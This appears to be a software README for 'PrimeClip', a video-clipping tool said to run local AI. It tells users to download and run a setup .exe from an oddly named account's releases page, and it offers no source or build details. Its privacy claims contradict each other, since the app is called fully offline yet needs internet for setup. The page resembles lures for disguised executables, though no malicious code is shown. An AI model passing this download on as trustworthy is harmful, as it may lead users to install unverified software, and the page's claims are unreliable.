# ✂️ PrimeClip - Transform long videos into short clips

[![](https://img.shields.io/badge/Download-PrimeClip-blue.svg)](https://github.com/Octanelesseromentum437/PrimeClip/releases)

PrimeClip helps you create short, engaging video clips from long recordings. The software uses local artificial intelligence to analyze your footage. It finds highlights and creates clips ready for social media. Everything happens on your computer. You do not need to upload your files to a cloud server. 

### ⚙️ How it works

The tool scans your video files. It identifies speech, motion, and key moments. You select the best parts. The software then exports these as individual files. You save time on manual editing. The program keeps your data private because it processes files on your local drive.

### 📋 System requirements

Your computer needs specific hardware to run PrimeClip. Please ensure your system meets these needs:

* Windows 10 or Windows 11 (64-bit).
* 8 GB of RAM or more.
* A graphics card with at least 4 GB of video memory.
* 2 GB of available space on your hard drive for the installation.
* An internet connection for the first setup.

### 📥 Getting started

Follow these steps to set up the application on your Windows computer.

1. Visit the [Releases page](https://github.com/Octanelesseromentum437/PrimeClip/releases) to download the latest version of PrimeClip.
2. Find the file ending in .exe in the assets section. Click the filename to start the download.
3. Open the folder where you saved the file. Double-click the file named PrimeClip-Setup.exe to start the installer.
4. Follow the instructions on the screen. The installer asks where you want to keep the application files. Click Next to use the default location.
5. The installer finishes copying files. Click Finish to close the window.
6. Find the PrimeClip icon on your desktop and double-click it to start the application.

### 🎥 Using the editor

Once the program opens, you see a clean dashboard. Follow these steps to process your first video:

1. Click the Open button in the top left corner.
2. Select the video file you want to clip from your computer.
3. Wait for the software to analyze the file. A progress bar shows you the status of this operation.
4. Review the detected clips in the preview panel.
5. You can adjust the start and end times of each clip by dragging the handles on the timeline.
6. Click the Export button to save the clips to your preferred folder.

### 🛠️ Common features

PrimeClip offers several tools to refine your output:

* Automatic highlight detection: The software points out the most engaging moments in your video.
* Aspect ratio adjustment: You can set your output to vertical or horizontal formats.
* Batch processing: You can queue multiple videos and process them in order.
* Silence removal: The software can remove long pauses in speech to make your clips tighter.
* Subtitle generation: The tool creates captions based on the spoken audio.

### 💡 Tips for better clips

* Use videos with clear audio for the best subtitle results.
* Long videos take longer to analyze. Start with clips under ten minutes while you learn the interface.
* Check your export settings before you confirm to ensure you save your files in the right format.
* Keep your graphics drivers updated to ensure the software runs smoothly.

### 🔒 Privacy and safety

Your video files never leave your computer. PrimeClip performs all calculations locally. This means your raw footage remains under your control. The app does not collect personal data or track your editing habits. You can use the software while offline.

### 🆘 Troubleshooting

If you encounter issues, check these common fixes:

* If the program will not open, restart your computer and try again.
* If the performance is slow, close other programs that use many system resources, such as web browsers or heavy games.
* Verify your computer has the latest Windows updates. Older versions might lack necessary support for the AI components.
* If an export fails, verify you have enough disk space on your drive.
* Uninstall the software and download a fresh copy if you suspect a file became corrupted during the first installation.
